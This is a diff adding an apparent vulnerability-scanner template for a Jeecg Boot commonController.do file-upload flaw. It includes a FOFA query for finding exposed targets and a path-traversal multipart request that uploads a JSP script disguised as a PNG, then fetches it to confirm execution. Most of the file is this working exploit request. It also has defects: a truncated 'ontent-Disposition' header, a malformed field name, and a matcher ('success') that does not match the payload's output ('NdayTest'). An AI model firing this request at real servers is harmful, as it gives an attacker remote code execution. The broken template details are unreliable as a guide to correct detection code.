@@ -1,0 +1,49 @@
+id: jeecgboot-file-upload
+
+info:
+  name: "Jeecg Boot commonController.do 接口文件上传导致远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="JEECG"
+          Jeecg-Boot快速开发平台作为企业级J2EE项目开发框架，广泛应用于MIS/OA/ERP/Crm等系统。其commonController.do接口在文件上传功能实现中存在安全缺陷，攻击者可通过上传恶意脚本来实现远程代码执行，从而获取服务器控制权限。
+  tags: Jeecg
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /api/../commonController.do?parserXml HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+    Connection: close
+
+    ------WebKitFormBoundarygcflwtei
+    Content-Disposition: form-data; "name="name"
+
+    zW9YCa.png
+    ------WebKitFormBoundarygcflwtei
+    ontent-Disposition: form-data; name="documentTitle"
+
+    blank
+    ------WebKitFormBoundarygcflwtei
+    Content-Disposition: form-data; name="file"; filename="NTest.jsp"
+    Content-Type: image/png
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundarygcflwtei--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
